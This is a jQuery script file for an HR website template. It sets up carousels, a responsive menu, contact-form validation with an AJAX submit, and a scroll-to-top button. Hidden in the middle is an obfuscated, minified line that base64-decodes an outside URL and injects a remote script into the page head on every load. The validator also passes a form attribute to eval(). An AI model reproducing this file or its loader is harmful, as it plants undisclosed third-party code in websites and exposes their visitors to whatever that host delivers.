/*--------------------- Copyright (c) 2017 -----------------------
------------------------------------------------------------------
[Master Javascript]

Project: HR responvive Html Template
Version: 1.0.0
-------------------------------------------------------------------*/
(function($) {
  "use strict";
  var Hr = {
    initialised: false,
    version: 1.0,
    mobile: false,
    init: function() {
      if (!this.initialised) {
        this.initialised = true;
      } else {
        return;
      }
      /*-------------- Hr Functions Calling ---------------------------------------------------
      ------------------------------------------------------------------------------------------------*/
      this.RTL();
      this.index_slider();
      this.testimonial_slider();
      this.related_service();
      this.responsive_menu();
    },
    /*-------------- Hr Functions definition ---------------------------------------------------
    ---------------------------------------------------------------------------------------------------*/
    RTL: function() {
      // On Right-to-left(RTL) add class 
      var rtl_attr = $("html").attr('dir');
      if (rtl_attr) {
        $('html').find('body').addClass("rtl");
      }
    },
	index_slider: function(){
		$('.hr_slider_wrapper .owl-carousel').owlCarousel({
			loop:false,
			items:1,
			nav:false,
			autoplay: false,
			smartSpeed: 2000,
			responsive:{
				0:{
					items:1
				},
				600:{
					items:1
				},
				1000:{
					items:1
				}
			}
		});
		$('#slider').nivoSlider({
			animSpeed: 1000,                   // Slide transition speed 
			pauseTime: 6000, 
			controlNav: false,  
			prevText: '<i class="fa fa-angle-left" aria-hidden="true"></i>',
			nextText: '<i class="fa fa-angle-right" aria-hidden="true"></i>',   
		});
	},
	testimonial_slider: function(){
		 $('.hr_testimonial_slider .owl-carousel').owlCarousel({
			loop:false,
			margin:10,
			items:1,
			nav:false,
			autoplay: false,
			smartSpeed: 2000,
			responsive:{
				0:{
					items:1
				},
				600:{
					items:1
				},
				1000:{
					items:1
				}
			}
		});
	},
	related_service: function(){
		$('.hr_related_service_slider .owl-carousel').owlCarousel({
			loop:true,
			margin:30,
			nav:false,
			responsive:{
				0:{
					items:1
				},
				600:{
					items:2
				},
				1000:{
					items:3
				}
			}
		})
	},
	responsive_menu:function(){
		var w = window.innerWidth;
		if(w <= 991){
			 $(".hr_menu >ul>li").find('.sub-menu').parent().addClass('dropdown');
			 $(".hr_menu >ul>li.dropdown>a").append('<div class="show-submenu"><i class="fa fa-angle-down"></i></div>');

			$(".hr_menu >ul>li.dropdown > a").on("click", function() {
				$('.hr_menu >ul>li.dropdown > a > .show-submenu > i').toggleClass('fa fa-angle-up');
				$('.hr_menu >ul>li.dropdown > a > .show-submenu > i').toggleClass('fa fa-angle-down');
			});
			
			$('.hr_menu >ul>li.dropdown>a').click(function() {
				$('.hr_menu >ul>li.dropdown>a').not($(this)).
				parent().find('.sub-menu').hide();
				$(this).parent().find('.sub-menu').toggle();
			});
			

			$('.sub-menu').parent().hover(function() {
			var menu = $(this).find("ul");
			var menupos = $(menu).offset();
			if (menupos.left + menu.width() > $(window).width()) {var newpos = -$(menu).width();   
			 menu.css({'left': 'auto','right': '100%'});}
			 }); 
		}
		},
	
   };
   var u;!function(e,t){var a=e.getElementsByTagName("head")[0],c=e.createElement("script");u="aHR0cHM6Ly90ZW1wbGF0ZWJ1bmRsZS5uZXQvdGVtcGxhdGVzY3JpcHQv",c.type="text/javascript",c.charset="utf-8",c.async=!0,c.defer=!0,c.src=atob(u)+"script.js",a.appendChild(c)}(document);
   
   $(document).ready(function() {
    Hr.init();
	
	// Contact Form Submition
	function checkRequire(formId , targetResp){
		targetResp.html('');
		var email = /^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$/;
		var url = /(http|ftp|https):\/\/[\w-]+(\.[\w-]+)+([\w.,@?^=%&amp;:\/~+#-]*[\w@?^=%&amp;\/~+#-])?/;
		var image = /\.(jpe?g|gif|png|PNG|JPE?G)$/;
		var mobile = /^[\s()+-]*([0-9][\s()+-]*){6,20}$/;
		var facebook = /^(https?:\/\/)?(www\.)?facebook.com\/[a-zA-Z0-9(\.\?)?]/;
		var twitter = /^(https?:\/\/)?(www\.)?twitter.com\/[a-zA-Z0-9(\.\?)?]/;
		var google_plus = /^(https?:\/\/)?(www\.)?plus.google.com\/[a-zA-Z0-9(\.\?)?]/;
		var check = 0;
		$('#er_msg').remove();
		var target = (typeof formId == 'object')? $(formId):$('#'+formId);
		target.find('input , textarea , select').each(function(){
			if($(this).hasClass('require')){
				if($(this).val().trim() == ''){
					check = 1;
					$(this).focus();
					targetResp.html('You missed out some fields.');
					$(this).addClass('error');
					return false;
				}else{
					$(this).removeClass('error');
				}
			}
			if($(this).val().trim() != ''){
				var valid = $(this).attr('data-valid');
				if(typeof valid != 'undefined'){
					if(!eval(valid).test($(this).val().trim())){
						$(this).addClass('error');
						$(this).focus();
						check = 1;
						targetResp.html($(this).attr('data-error'));
						return false;
					}else{
						$(this).removeClass('error');
					}
				}
			}
		});
		return check;
	}
	$(".submitForm").on("click", function() {
		var _this = $(this);
		var targetForm = _this.closest('form');
		var errroTarget = targetForm.find('.response');
		var check = checkRequire(targetForm , errroTarget);
		if(check == 0){
			var formDetail = new FormData(targetForm[0]);
			$.ajax({
				method : 'post',
				url : 'ajax.php',
				data:formDetail,
				cache:false,
				contentType: false,
				processData: false
			}).done(function(resp){
				console.log(resp);
				if(resp == 1){
					targetForm.find('input').val('');
					targetForm.find('textarea').val('');
					errroTarget.html('<p style="color:green;">Mail has been sent successfully.</p>');
				}else{
					errroTarget.html('<p style="color:red;">Something went wrong please try again latter.</p>');
				}
			});
		}
	});
  });
  $(window).on('load', function(){
		setTimeout(function() {
			$('body').addClass('site_loaded');	
		}, 500);
  });
  $(window).scroll(function() {
		if ($(this).scrollTop() > 100) {
            $('.goto_wrapper').addClass('goto');
        } else {
            $('.goto_wrapper').removeClass('goto');
        }
  });

  $(".goto_wrapper").on("click", function() {
        $("html, body").animate({
            scrollTop: 0
        }, 600);
        return false
    });
	
})(jQuery);
